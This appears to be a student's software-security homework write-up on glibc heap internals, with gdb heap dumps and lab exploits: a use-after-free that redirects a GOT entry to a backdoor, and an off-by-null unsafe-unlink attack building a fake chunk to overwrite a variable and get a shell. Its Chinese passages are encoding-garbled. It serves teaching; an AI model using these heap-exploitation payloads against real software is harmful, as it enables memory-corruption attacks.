<center><font size=7>ã€Šè½¯ä»¶å®‰å…¨ã€‹HW04</font></center><br /><div align='right'><font size=4><b>é™ˆå¸Œå°§</b> 3180103012</font></div>

[TOC]

# Principle

## struct malloc_chunk

```c
struct malloc_chunk {
    INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free).  */
    INTERNAL_SIZE_T mchunk_size;      /* Size in bytes, including overhead. */

    struct malloc_chunk *fd; /* double links -- used only if free. */
    struct malloc_chunk *bk;

    /* Only used for large blocks: pointer to next larger size.  */
    struct malloc_chunk *fd_nextsize; /* double links -- used only if free. */
    struct malloc_chunk *bk_nextsize;
};
```

* `mchunk_prev_size`ï¼šå‰ä¸€ä¸ªchunkçš„sizeï¼Œå½“ä¸”ä»…å½“å½“å‰ä¸€ä¸ªchunkä¸ºfreeçŠ¶æ€æ—¶ï¼Œæ‰ä¼šå¯ç”¨ã€‚å¦‚æœå‰ä¸€ä¸ªchunkæ˜¯in_useçŠ¶æ€ï¼Œåˆ™ä¼šæœ‰ç©ºé—´å¤ç”¨çš„ç°è±¡ï¼Œè¿™ä¸ªåœ¨ä¹‹åä¼šæåˆ°ã€‚
* `mchunk_size`å‘ä¸Š16byteså¯¹é½ï¼Œå› æ­¤ä½3bitsè¢«ä½œä¸ºflagã€‚
    * `chunk_size = ( request_size + 8 ) # 16`ï¼ˆ==ä½†ä¸€å®šè¦å¤§äºç­‰äº0x20å­—èŠ‚ç»™metadata==ï¼‰
    * å…¶ä¸­ï¼Œæœ€ä½ä½ï¼ˆ`mchunk_size & 1`ï¼‰è¡¨ç¤º**PREV_INUSE**ï¼Œè®°å½•å‰ä¸€ä¸ª chunk å—æ˜¯å¦è¢«åˆ†é…ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå †ä¸­ç¬¬ä¸€ä¸ªè¢«åˆ†é…çš„å†…å­˜å—çš„ size å­—æ®µçš„ P ä½éƒ½ä¼šè¢«è®¾ç½®ä¸º 1ï¼Œä»¥ä¾¿äºé˜²æ­¢è®¿é—®å‰é¢çš„éæ³•å†…å­˜ã€‚å½“ä¸€ä¸ª chunk çš„ size çš„ P ä½ä¸º 0 æ—¶ï¼Œæˆ‘ä»¬èƒ½é€šè¿‡ prev_size å­—æ®µæ¥è·å–ä¸Šä¸€ä¸ª chunk çš„å¤§å°ä»¥åŠåœ°å€ã€‚è¿™ä¹Ÿæ–¹ä¾¿è¿›è¡Œç©ºé—² chunk ä¹‹é—´çš„åˆå¹¶ã€‚
* **fd/bk**ï¼šä»…ç”¨äºè¢«freeä¹‹åçš„ç©ºé—²çŠ¶æ€çš„chunkï¼Œè¢«freeä¹‹åçš„chunkï¼Œé€šå¸¸ä¼šæ ¹æ®å¤§å°è¢«åˆ†é…åœ¨ä¸åŒçš„biné‡Œé¢ï¼Œbinç”±glibcç»´æŠ¤ï¼Œå­—é¢æ„æ€ï¼Œå°±åƒä¸€ä¸ªåƒåœ¾æ¡¶ï¼Œç”¨äºå›æ”¶è¿™äº›ç©ºé—²çš„å†…å­˜ç¢ç‰‡ã€‚ä¸”ç”±äºè¿™äº›ç¢ç‰‡å¤§æ¦‚ç‡ä¸æ˜¯ç›¸é‚»çš„ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ä¸€ä¸ªé“¾è¡¨æ¥æŠŠç¢ç‰‡ä¸²èµ·æ¥ï¼Œç­‰åˆ°è¦ç”¨çš„æ—¶å€™å†æ¥æ‰¾binæ‹¿å°±æ˜¯äº†ã€‚**tcachebin** ä¸**fastbin**æ¯”è¾ƒç‰¹æ®Šï¼Œä»–ä»¬ä¸ºäº†æ•ˆç‡ï¼Œä½¿ç”¨å•å‘é“¾è¡¨è¿›è¡Œç»´æŠ¤ï¼Œå› æ­¤ä»…ä»…ç”¨åˆ°äº†`fd`ï¼Œæ­¤å¤–çš„binä½¿ç”¨åŒå‘é“¾è¡¨ï¼Œå³`fd`å’Œ`bk`ä¸€èµ·ç»´æŠ¤ã€‚

```
An allocated chunk looks like this:


    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|M|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             (size of chunk, but used for application data)    |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|1|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

Free chunks are stored in circular doubly-linked lists, and look like this:

    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `head:' |             Size of chunk, in bytes                     |A|0|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Forward pointer to next chunk in list             |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Back pointer to previous chunk in list            |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Unused space (may be 0 bytes long)                .
            .                                                               .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `foot:' |             Size of chunk, in bytes                           |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|0|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```



## struct malloc_state

```c
struct malloc_state
{
    ......
    /* Fastbins */
    mfastbinptr fastbinsY[NFASTBINS];
    /* Base of the topmost chunk -- not otherwise kept in a bin */
    mchunkptr top;
    ......
    /* Normal bins packed as described above */
    mchunkptr bins[NBINS * 2 - 2];
    ......
};
```

* malloc_state (arena)ï¼Œå­˜æ”¾åœ¨libcä¸­ï¼Œæœ‰glibcå¯¹å…¶è¿›è¡Œç»´æŠ¤ã€‚
* å½“æˆ‘ä»¬éœ€è¦ä»binä¸­è·å–freeçŠ¶æ€çš„chunkæ—¶ï¼Œé€šå¸¸å°±ä¼šè®¿é—®è¿™ä¸ªç»“æ„ä½“ï¼ŒæŸ¥çœ‹å…¶ä¸­`fastbinsY[NFASTBINS]`ä»¥åŠ`bins[NBINS * 2 - 2]`æ•°ç»„ä¸­æ˜¯å¦å­˜æ”¾æœ‰ç¬¦åˆè¿™æ¬¡requestçš„chunkã€‚
* `fastbinsY`ä¸­å­˜æ”¾çš„éƒ½æ˜¯å•å‘é“¾è¡¨ï¼Œ`bins`ä¸­å­˜æ”¾çš„éƒ½æ˜¯åŒå‘é“¾è¡¨ã€‚fastbinåŠå…¶ä»–binï¼Œä»¥chunkçš„sizeä¸ºä¾æ®ï¼Œå„è‡ªæ¥æ”¶ä¸åŒçš„å †å—ã€‚
* `top`å­—æ®µæŒ‡å‘ä¸€ä¸ªå·¨å¤§çš„chunkï¼Œè¢«æˆ‘ä»¬ç§°ä¸ºtop_chunkï¼Œå¯ä»¥æŠŠtop_chunkæƒ³è±¡ä¸ºä¸€å—å¤§è›‹ç³•ï¼Œå½“æ— æ³•ä»binä¸­æ‰¾åˆ°ç¬¦åˆè¦æ±‚çš„chunkæ—¶ï¼Œä¾¿ä¼šåˆ°top_chunkä¸­å»åˆ‡ä¸€å—æ¥ä½¿ç”¨ã€‚

## \_int\_malloc

* `checked_request2size`æ˜¯ä¸ªå®ï¼Œå°†argv `bytes`è½¬æˆchunk_size `nb`
    * `USE_TCACHE`ï¼šTcacheæ˜¯ä¸€ç§ç±»ä¼¼fastbinçš„æ–°å‹æœºåˆ¶ï¼Œä¸ºäº†è¿½æ±‚æ€§èƒ½ï¼Œè€Œå®Œå…¨å¿½ç•¥äº†å®‰å…¨æ€§å¦‚æœä½¿ç”¨äº†tcache ä¼šä¼˜å…ˆä»tcacheä¸­æ‹¿chunk

## \_int\_free

```c
#define chunk_at_offset(p, s) ((mchunkptr)(((char *)(p)) + (s)))

if (!prev_inuse(p)) {
    prevsize = prev_size(p);
    size += prevsize;
    p = chunk_at_offset(p, -((long)prevsize));  // !!!
    unlink(av, p, bck, fwd);
}
```

## unlink

### 2 Checks

```c
#define PREV_INUSE 0x1
#define IS_MMAPPED 0x2
#define NON_MAIN_ARENA 0x4
#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)       // 0b111
#define chunksize_nomask(p) ((p)->mchunk_size)
#define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS))          // & 0xfffffff8, flags not inc
#define next_chunk(p) ((mchunkptr)(((char *)(p)) + chunksize(p)))  // flags not inc
#define prev_size(p) ((p)->mchunk_prev_size)                       // flags included

// P is addr_fake_chunk, BK and FD is tmp var
#define unlink(AV, P, BK, FD)                                               \
    {                                                                       \
        if (__builtin_expect(chunksize(P) != prev_size(next_chunk(P)), 0))  \
            malloc_printerr("corrupted size vs. prev_size");                \
        FD = P->fd;                                                         \
        BK = P->bk;                                                         \
        if (__builtin_expect(FD->bk != P || BK->fd != P, 0))                \
            malloc_printerr("corrupted double-linked list");                \
        else {                                                              \
            FD->bk = BK;                                                    \
            BK->fd = FD;                                                    \
            /* ...... */                                                    \
        }                                                                   \
    }
```

### Next size

```c
#define NBINS 128
#define NSMALLBINS 64
#define SMALLBIN_WIDTH MALLOC_ALIGNMENT                                       // 16
#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT > 2 * SIZE_SZ)                  // 16 > 16 = 0
#define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)  // 1024 = 0x400

#define in_smallbin_range(sz) ((unsigned long)(sz) < (unsigned long)MIN_LARGE_SIZE)

#define unlink(AV, P, BK, FD)                                                    \
    {                                                                            \
        if (__builtin_expect(chunksize(P) != prev_size(next_chunk(P)), 0))       \
            malloc_printerr("corrupted size vs. prev_size");                     \
        FD = P->fd;                                                              \
        BK = P->bk;                                                              \
        if (__builtin_expect(FD->bk != P || BK->fd != P, 0))                     \
            malloc_printerr("corrupted double-linked list");                     \
        else {                                                                   \
            FD->bk = BK;                                                         \
            BK->fd = FD;                                                         \
            if (in_smallbin_range(chunksize_nomask(P)) &&                        \
                __builtin_expect(P->fd_nextsize != NULL, 0)) {                   \
                if (__builtin_expect(P->fd_nextsize->bk_nextsize != P, 0) ||     \
                    __builtin_expect(P->bk_nextsize->fd_nextsize != P, 0))       \
                    malloc_printerr("corrupted double-linked list (not small)"); \
                if (FD->fd_nextsize == NULL) {                                   \
                    if (P->fd_nextsize == P)                                     \
                        FD->fd_nextsize = FD->bk_nextsize = FD;                  \
                    else {                                                       \
                        FD->fd_nextsize             = P->fd_nextsize;            \
                        FD->bk_nextsize             = P->bk_nextsize;            \
                        P->fd_nextsize->bk_nextsize = FD;                        \
                        P->bk_nextsize->fd_nextsize = FD;                        \
                    }                                                            \
                } else {                                                         \
                    P->fd_nextsize->bk_nextsize = P->bk_nextsize;                \
                    P->bk_nextsize->fd_nextsize = P->fd_nextsize;                \
                }                                                                \
            }                                                                    \
        }                                                                        \
    }
```

# Lab

## 01_test

### notcache

**edit .gdbinit**

```
source /home/student/Downloads/pwndbg-2020.07.23/gdbinit.py
set breakpoint pending on
b main
b test.c:13
b test.c:18
b test.c:23
b test.c:32
b test.c:36
b test.c:41
b test.c:50
b test.c:55
```

**testing**

```bash
$ LD_LIBRARY_PATH=./notcache
$ echo $LD_LIBRARY_PATH
$ gdb ./test.notcache # with .gdbinit
```

**checkpoints with heap content**

```markdown
# C0
## alloc a[0]
Allocated chunk | PREV_INUSE
Addr: 0x555555756000
Size: 0x21
## alloc a[1]
Allocated chunk | PREV_INUSE
Addr: 0x555555756020
Size: 0x21

# C1
## alloc b[0]
Allocated chunk | PREV_INUSE
Addr: 0x555555756040
Size: 0x21
## alloc b[1]
Allocated chunk | PREV_INUSE
Addr: 0x555555756060
Size: 0x21

# C2
## alloc c[0]
Allocated chunk | PREV_INUSE
Addr: 0x555555756080
Size: 0x31
## alloc c[1]
Allocated chunk | PREV_INUSE
Addr: 0x5555557560b0
Size: 0x31

# C3
## alloc protect
Allocated chunk | PREV_INUSE
Addr: 0x5555557560e0
Size: 0x111
## free a[0]
Free chunk (fastbins) | PREV_INUSE
Addr: 0x555555756000
Size: 0x21
fd: 0x00
## free a[1]
Free chunk (fastbins) | PREV_INUSE
Addr: 0x555555756020
Size: 0x21
fd: 0x555555756000
## free b[0]
Free chunk (fastbins) | PREV_INUSE
Addr: 0x555555756040
Size: 0x21
fd: 0x555555756020
## free b[1]
Free chunk (fastbins) | PREV_INUSE
Addr: 0x555555756060
Size: 0x21
fd: 0x555555756040

# C4
## alloc recatch (chunk of b[1])
Allocated chunk | PREV_INUSE
Addr: 0x555555756060
Size: 0x21

# C5
## free c[0]
Free chunk (fastbins) | PREV_INUSE
Addr: 0x555555756080
Size: 0x31
fd: 0x00
## free c[1]
Free chunk (fastbins) | PREV_INUSE
Addr: 0x5555557560b0
Size: 0x31
fd: 0x555555756080

# C6
## free protect ?
Free chunk (smallbins) | PREV_INUSE
Addr: 0x555555756000
Size: 0x61
fd: 0x7ffff7dd0cd0
bk: 0x7ffff7dd0cd0
## alloc a[0]
Allocated chunk | PREV_INUSE
Addr: 0x555555756080
Size: 0x511
## alloc a[1]
Allocated chunk | PREV_INUSE
Addr: 0x555555756590
Size: 0x511
## alloc protect
Allocated chunk | PREV_INUSE
Addr: 0x555555756aa0
Size: 0x511

# C7
## free a[0] and a[1]
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x555555756080
Size: 0xa21
fd: 0x7ffff7dd0c80
bk: 0x7ffff7dd0c80
```

Screenshots after checkpoint-7:

<img src="assets/image-20210524152841781.png" style="zoom:50%;" />

### tcache

```bash
$ LD_LIBRARY_PATH=./tcache
$ echo $LD_LIBRARY_PATH
$ gdb ./test.tcache
```

**checkpoints with heap content**

```markdown
# C0
## alloc tcache
Allocated chunk | PREV_INUSE
Addr: 0x555555756000
Size: 0x251
## alloc a[0]
Allocated chunk | PREV_INUSE
Addr: 0x555555756250
Size: 0x21
## alloc a[1]
Allocated chunk | PREV_INUSE
Addr: 0x555555756270
Size: 0x21

# C1
## alloc b[0]
Allocated chunk | PREV_INUSE
Addr: 0x555555756290
Size: 0x21
## alloc b[1]
Allocated chunk | PREV_INUSE
Addr: 0x5555557562b0
Size: 0x21

# C2
## alloc c[0]
Allocated chunk | PREV_INUSE
Addr: 0x5555557562d0
Size: 0x31
## alloc c[1]
Allocated chunk | PREV_INUSE
Addr: 0x555555756300
Size: 0x31

# C3
## alloc protect
Allocated chunk | PREV_INUSE
Addr: 0x555555756330
Size: 0x111
## free a[0]
Free chunk (tcache) | PREV_INUSE
Addr: 0x555555756250
Size: 0x21
fd: 0x00
## free a[1]
Free chunk (tcache) | PREV_INUSE
Addr: 0x555555756270
Size: 0x21
fd: 0x555555756260
## free b[0]
Free chunk (tcache) | PREV_INUSE
Addr: 0x555555756290
Size: 0x21
fd: 0x555555756280
## free b[1]
Free chunk (tcache) | PREV_INUSE
Addr: 0x5555557562b0
Size: 0x21
fd: 0x5555557562a0

# C4
## alloc recatch (chunk of b[1])
Allocated chunk | PREV_INUSE
Addr: 0x5555557562b0
Size: 0x21

# C5
## free c[0]
Free chunk (tcache) | PREV_INUSE
Addr: 0x5555557562d0
Size: 0x31
fd: 0x00
## free c[1]
Free chunk (tcache) | PREV_INUSE
Addr: 0x555555756300
Size: 0x31
fd: 0x5555557562e0

# C6
## free protect ?
Free chunk (tcache) | PREV_INUSE
Addr: 0x555555756330
Size: 0x111
fd: 0x00
## alloc a[0]
Allocated chunk | PREV_INUSE
Addr: 0x555555756440
Size: 0x511
## alloc a[1]
Allocated chunk | PREV_INUSE
Addr: 0x555555756950
Size: 0x511
## alloc protect
Allocated chunk | PREV_INUSE
Addr: 0x555555756e60
Size: 0x511

# C7
## free a[0] and a[1]
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x555555756440
Size: 0xa21
fd: 0x7ffff7dcdca0
bk: 0x7ffff7dcdca0
```

Screenshots after checkpoint-7:

<img src="assets/image-20210524222333597.png" style="zoom:50%;" />

### Compare

1. å¼€å¯tcacheå’Œä¸å¼€å¯tcacheåˆå§‹å †çŠ¶æ€æœ‰ä»€ä¹ˆåŒºåˆ«
    * å¼€å¯tcacheä¼šå…ˆåˆ†é…å‡ºä¸€ä¸ªå¤§å°ä½0x250çš„chunkç”¨äºtcacheï¼Œç„¶åä¹‹åç»™a[0]å’Œa[1]åˆ†é…çš„åœ°å€å°±ä¼šç›¸å¯¹baseæœ‰ä¸€ä¸ª0x250çš„åç§»
2. å¼€å¯tcacheå’Œä¸å¼€å¯tcacheåœ¨checkpoint-3æ—¶freeåå­˜åœ¨çš„åŒºåˆ«
    * notcacheä¸­çš„fdç”¨ä¸Šä¸€ä¸ªchunkçš„å¤´åœ°å€æ¥é“¾freeåçš„chunkï¼Œè€Œtcacheçš„å•é“¾è¡¨é“¾çš„æ˜¯ç”¨æˆ·æ€å¯è§çš„fdæ¥é“¾çš„ï¼Œè¿™ä¸ªç”¨æˆ·æ€çš„fdå’Œchunkçš„å¤´åœ°å€ä¼šæœ‰0x10çš„offsetï¼Œåæ˜ åœ¨fdä¸Šå°±æ˜¯ä»–ä¼šæ¯”ä¸Šä¸€ä¸ªchunkçš„å¤´åœ°å€é«˜0x10
3. checkpoint-4æ—¶æ‹¿åˆ°çš„chunkæ˜¯ä¹‹å‰å“ªæ¡è¯­å¥é‡Šæ”¾çš„ï¼Œæœ‰æ— tcacheç°è±¡æ˜¯å¦ä¸ä¸€æ ·?
    * b[1]ï¼Œæ— ä¸åŒ
4. checkpoint-7æ—¶è¢«é‡Šæ”¾çš„a[0], a[1]æ˜¯æ€æ ·ç»„ç»‡çš„ï¼Œæœ‰æ— tcacheç°è±¡æ˜¯å¦ä¸ä¸€æ ·?
    * åˆå¹¶åˆ°ä¸€ä¸ªunsortedbinç±»å‹çš„chunkä¸­ï¼Œæ— ä¸åŒ

## 02_UAF

### Discover heap

Heap contents after adding A, B, C and finish A, B

<img src="assets/image-20210525131030846.png" style="zoom:50%;" />

Here we can see that the offset between `B.fd` and `&A` is 0x10 (A is 2e0, B is 330, C is 3d0)

After reallocate chunk of A and B for D and E, the heap contents becomes

<img src="assets/image-20210525133326331.png" style="zoom:50%;" />

where D is 330, E is 2e0

The linked list is as follows

```markdown
# After free A, B
tcache -> B -> A
# After allocate D, E
A(E), B(D), C
```

Another thing to mention is that `0x50 = (0x40 + 8) # 16` where 0x50 and 0x40 is chunk size and struct size respectively.

### Exploit

Create 3 ddl:

```python
add_ddl_conn()  # A
add_ddl_conn()  # B
add_ddl_conn()  # C
```

Delete A and B in sequence:

```python
finish_ddl_conn(1)
finish_ddl_conn(2)
```

Since the chunk is as bellow:

```
+------------------+------------------+
| mchunk_prev_size |   mchunk_size    |
+------------------+------------------+ ---------
|        fd        |        bk        |     â†‘
+------------------+------------------+  ddl_time
|                  |                  |     â†“
+------------------+------------------+----------
|                  |                  |     â†‘
+------------------+------------------+  ddl_content
|                  |                  |     â†“
+------------------+------------------+ ---------
```

The fd and the `ddl_mgr.ddl_time` will have the same address.

Edit the freed B chunk, use the got of `exit` to overwrite the fd:

```python
edit_ddl_conn(2, p64(got_exit))
```

Enter the GOT table by adding 2 ddls, then overwrite `exit`'s' GOT entry with `backdoor`'s addr:

```python
add_ddl_conn()                    # D
add_ddl_conn(p64(addr_backdoor))  # E
```

Call `exit` to enter `backdoor`:

```python
exit_ddl_conn()
```

Hijacked:

<img src="assets/image-20210525145608122.png" style="zoom:50%;" />

## 03_Unsafe_Unlink

### Discover heap

Since the const `DDL_CONTENT` used here is 0x5d8 while `ddl_time` is still 0x20, the size of the struct will be 0x5f8 and align to 0x600(+8, #16) to form chunk:

<img src="assets/image-20210525184325499.png" style="zoom:50%;" />

After adding 3 ddl obj, the heap is as follows:

<img src="assets/image-20210525184435542.png" style="zoom:50%;" />

After freeing the second ddl object, the heap is as follows:

<img src="assets/image-20210525221605337.png" style="zoom:50%;" />

Another demo, creating 4 objs then free 1st and 3rd:

<img src="assets/image-20210527193440343.png" style="zoom:50%;" />

### Exploit

#### Off-by-null

Since the chunk is as bellow:

```
+------------------+------------------+ ------
| mchunk_prev_size |   mchunk_size    |   â†‘
+------------------+------------------+   |
|   time[0:8](fd)  |  time[8:16](bk)  |   |
+------------------+------------------+   |
|   time[16:24]    |   time[24:32]    |   |
+------------------+------------------+  600B, chunkA
|   con[0x0:0x8]   |  con[0x8:0x10]   |   |
+------------------+------------------+   |
|       ....       |       ....       |   |
+------------------+------------------+   |
| con[0x5c0:0x5c8] | con[0x5c8:0x5d0] |   â†“
+------------------+------------------+ ------
| con[0x5d0:0x5d8] |   mchunk_size    |   â†‘
+------------------+------------------+   |
|                  |                  |  600B, chunkB
+------------------+------------------+   |
```

Since `get_input_custom(char *ptr, int len)` can only get len of valid input('\n' not included), and if input is more than len bytes, only len bytes(`ptr[0:len]`) will be taken and `ptr[len]` will be '\\0'.

So the extra '\0' can be used to overwrite the `mchunk_size[0:8]` of next chunk, the `chunkB.mchunk_size` will turn from `b'\x01\x06\x00\x00\x00\x00\x00\x00'` to `b'\x00\x06\x00\x00\x00\x00\x00\x00'` (= 0x600). After freeing the chunkB, chunkA will be unlinked since `chunkB.mchunk.P` is now 0.

Also since the PREV_INUSE is now 0, the `chunkA.content[0x5d0:0x5d8]` will now be considered as the `chunkB.mchunk_prev_size`, use a fake one to overwrite it.

Construct the payload and use it to edit the first ddl obj:

```python
edit_ddl_conn(1, '', b'A' * (DDL_CONTENT - 8) + p64(0x600))
```

But that not enough, this will only leed to a crash of the program. We need to modify more.

#### Pass 2 checks

The unlink process is not so vulnerable that it has the following checks:

> ä¸è¿‡ï¼Œåœ¨glibcç‰ˆæœ¬ä¸æ–­æ›´æ–°çš„è¿‡ç¨‹ä¸­ï¼Œå„ç§ç±»å‹çš„ä¿æŠ¤ä¹Ÿå·²ç»å¼•å…¥äº†ï¼›å¯ä»¥çœ‹åˆ°å¦‚ä»£ç ä¸­æœ‰ä¸¤å¤„æ£€æŸ¥æŠ¥é”™ï¼Œç¬¬ä¸€å¤„æ£€æŸ¥äº†ä¼ªé€ çš„chunkçš„sizeå­—æ®µï¼Œè€Œç¬¬äºŒå¤„ï¼Œåˆ™æ˜¯å¯¹å°†è¦è®¿é—®çš„`FD->bk`è¿›è¡Œäº†æ£€æŸ¥ï¼Œå³ç›¸å½“äºæ£€æŸ¥äº†è¦æ‘˜é™¤çš„`chunk`å…¶`fd`æŒ‡é’ˆæŒ‡å‘çš„ä¸‹ä¸€ä¸ªchunkçš„`bk`æŒ‡é’ˆæ˜¯å¦æŒ‡å›äº†è¯¥chunkï¼Œè¿™æ ·çš„æ£€æŸ¥é™åˆ¶äº†æˆ‘ä»¬çš„`FD`ä¸èƒ½ä¸ºä»»æ„åœ°å€ï¼Œè€Œä¸€å®šæ˜¯ä¸€ä¸ªå¾€åå–24å­—èŠ‚åç§»éœ€è¦æŒ‡å›æ¥çš„åœ°å€

To pass `__builtin_expect(chunksize(P) != prev_size(next_chunk(P)), 0)`, notice here that `chunksize(P)` dose not take flags bits into considered but `prev_size(next_chunk(P))` does. So the prev_size of second chunk should have all flags set zeroes.

To pass `__builtin_expect(FD->bk != P || BK->fd != P, 0)`, `*(*(P + 16) + 24) == P && *(*(P + 24) + 16) == P` must be satisfied.

First I try getting this using gdb:

```python
pwndbg> p (int *) &array
$1 = (int *) 0x6020e0
pwndbg> p *(void **)array
$2 = (void *) 0x4847464544434241  # I used 'ABCDEFGH' as input
pwndbg> p (int *)&targetID
$3 = (int *) 0x6020c0 <targetID>
```

Here we get the addr of `targetID` which is 0x6020c0, it has an offset -0x11A0 to `arrat`

Rewrite the macro of unlink:

```c
fake_chunk->fd->bk = fake_chunk->bk;
fake_chunk->bk->fd = fake_chunk->fd;
```

If we use `targetID`'s addr minus 24 as `fake_chunk->fd`

Draw a graph to represent

```
+------------------+------------------+ <-- ary[0]-0x10 == old_ck
| mchunk_prev_size |   mchunk_size    |
+------------------+------------------+ <-- ary[0] == old_ck->ddl_time
|                  |                  | 
+------------------+------------------+
|                  |                  | 
+------------------+------------------+ <-- ary[0]+0x20 == old_ck->cont == fake_ck
| mchunk_prev_size |   mchunk_size    |
+------------------+------------------+
|        fd        |        bk        |
+------------------+------------------+
|       ....       |       ....       |
```

Try using this:

```python
edit_ddl_conn(1, p64(0)                    # fake_chunk.mchunk_prev_size
              + p64(size_fake_chunk + 1)   # fake_chunk.mchunk_size (P=1)
              + p64(addr_targetID - 24)    # fake_chunk.fd
              + p64(addr_fake_chunk - 16)  # fake_chunk.bk
              , b'A' * (DDL_CONTENT - 8) + p64(size_fake_chunk))
```

This payload will get an `b'corrupted double-linked list\n'`.

After that I found that the `fake_chunk.mchunk_prev_size` section is not in used, so why not try using it to pass the second check?

```python
edit_ddl_conn(index=1, time='whatever',
              content=p64(addr_fake_chunk)        # *P == fake_chunk.mchunk_prev_size
              + p64(size_fake_chunk | 1)          # fake_chunk.mchunk_size (P=1)
              + p64(addr_addr_fake_chunk - 0x18)  # fake_chunk.fd
              + p64(addr_addr_fake_chunk - 0x10)  # fake_chunk.bk
              + b'A' * (DDL_CONTENT - 0x28)       # ...
              + p64(size_fake_chunk))             # next_chunk.mchunk_prev_size
```

Apparently the `array[0]->ddl_content` is pointed to the fake chunk, which means `*addr_fake_chunk == addr_fake_chunk` There will be no error info then.

But why it still not working? (An EOF occur means the program crash) Reference to the [Next Chapter](#Unsafe-Unlink).

The final payload will be:

```python
edit_ddl_conn(index=1,
              time_nolf=p64(addr_array0)     # *P == fake_chunk.mchunk_prev_size
              + p64(size_fake_chunk | 1)     # fake_chunk.mchunk_size (P=1)
              + p64(addr_array - 0x18)       # FD->bk == addr_array0
              + p64(addr_array - 0x10),      # BK->fd == addr_array0
              content=p64(0)                 # P->fd_nextsize
              + b'A' * (DDL_CONTENT - 0x10)  # ...
              + p64(size_fake_chunk))        # next_chunk.mchunk_prev_size
```

#### Modify targetID

With the same principle, just change the position where a `addr_fake_chunk` is held to somewhere else while using `addr_targetID - 0x10` as the `fake_chunk.fd` so as to we can add a ddl obj with a non-zero `ddl_time` and pass the check.

Still consider the rule: `*(*(P + 16) + 24) == P && *(*(P + 24) + 16) == P`

However, the only value in the program that is closed to the address of current `fake_chunk` is `array[0]`. But it required the fake chunk starts from the `ddl_time` rather than the `ddl_content`. So re-draw the heap graph:

```
|       ....       |       ....       |
+------------------+------------------+ <-- targetID, 0x6020c0
|     targetID     |                  |
+------------------+------------------+
|                  |                  |
+------------------+------------------+ <-- ary, 0x6020e0
|     array[0]     |     array[1]     |
+------------------+------------------+
|                  |                  |
|      ......      |      ......      |
|                  |                  |
+------------------+------------------+ <-- â€»old_ck = ary[0] - 0x10, 0x603250
| mchunk_prev_size |   mchunk_size    |
+------------------+------------------+ <-- â€»fake_ck = ary[0], 0x603260
| mchunk_prev_size |   mchunk_size    |
+------------------+------------------+
|        fd        |        bk        |
+------------------+------------------+
|    fd_nextsize   |    bk_nextsize   |
+------------------+------------------+
|       ....       |       ....       |
```

Since there are operation `FD->bk = BK; BK->fd = FD;`. After first edit: `BK->fd == array[0]` will be `addr_array - 0x18` which is 0x6020c8.

We can edit 1st ddl again and modify `array[0][24]` (which is at `0x6020c8+24 == 0x6020e0 == &array[0]`)  to `&targetID`

```python
edit_ddl_conn(index=1, time_nolf=p192(0)+p64(addr_targetID))
```

Then, since `array[0]` is now `&targetID`, we can edit `array[0][0]` to deference `&targetID` and modify `targetID`'s value..

```
edit_ddl_conn(index=1, time_nolf=p64(3180103012) + b'\n')
```

Then check and get shell:

<img src="assets/image-20210528103015011.png" style="zoom:50%;" />

# Problem

## Debug Log

1. è™½ç„¶fdå’Œchunkæœ‰ä¸ª0x10çš„åç§»ï¼Œä½†æ˜¯åœ¨ä¿®æ”¹Bçš„æ—¶å€™æ˜¯ç”¨`edit_ddl_conn(2, p64(got_exit))`è€Œä¸æ˜¯`edit_ddl_conn(2, b'a' * 10 + p64(got_exit))`ï¼Œå› ä¸ºè¦ä¿®æ”¹çš„æ˜¯å†…æ ¸æ€çš„fdï¼Œè¿™ä¸ªä¸œè¥¿æ‰èƒ½æŒ‡å‘ä¸‹ä¸€ä¸ªç©ºchunkã€‚

